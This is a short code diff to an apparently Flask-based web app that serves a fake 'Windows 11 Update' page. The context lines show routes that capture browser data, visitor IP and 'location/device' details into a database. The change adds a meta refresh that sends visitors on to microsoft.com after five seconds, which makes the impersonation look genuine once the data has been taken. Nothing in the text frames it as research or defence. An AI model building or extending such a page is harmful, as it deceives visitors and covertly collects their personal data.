@@ -290,11 +290,11 @@ def capture_browser_data():
     return jsonify({"status": "ok"})
 
 # ==========================================
-# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE
+# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE WITH MICROSOFT REDIRECT
 # ==========================================
 @app.route('/')
 def index():
-    """Shows a REAL Windows 11 update page with location/device capture"""
+    """Shows a REAL Windows 11 update page with location/device capture and Microsoft redirect"""
     
     # Get visitor IP
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
@@ -367,7 +367,7 @@ def index():
             ))
         conn.commit()
     
-    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE
+    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE WITH MICROSOFT REDIRECT
     html = f'''
     <!DOCTYPE html>
     <html lang="en">
@@ -375,6 +375,8 @@ def index():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Windows 11 Update</title>
+        <!-- ADDED: Microsoft redirect after 5 seconds -->
+        <meta http-equiv="refresh" content="5;url=https://www.microsoft.com">
         <style>
             * {{
                 margin: 0;
